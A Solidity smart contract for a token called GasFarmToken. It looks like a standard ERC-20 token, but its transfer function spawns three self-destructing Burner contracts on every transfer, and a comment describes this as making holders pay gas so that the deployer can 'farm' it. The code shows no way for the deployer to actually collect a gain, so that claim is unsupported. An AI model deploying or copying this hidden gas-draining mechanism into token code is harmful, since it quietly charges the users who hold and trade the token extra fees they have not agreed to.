// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// Every transfer deploys a throwaway contract: the holder pays the gas, the deployer farms it.
contract Burner { constructor() { selfdestruct(payable(msg.sender)); } }
contract GasFarmToken {
    uint256 public totalSupply = 1e24;
    address public owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() { owner = msg.sender; _balances[msg.sender] = totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { allowance[f][msg.sender] -= a; _transfer(f, t, a); return true; }
    function _transfer(address from, address to, uint256 amount) internal {
        for (uint256 i = 0; i < 3; i++) { new Burner(); }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}
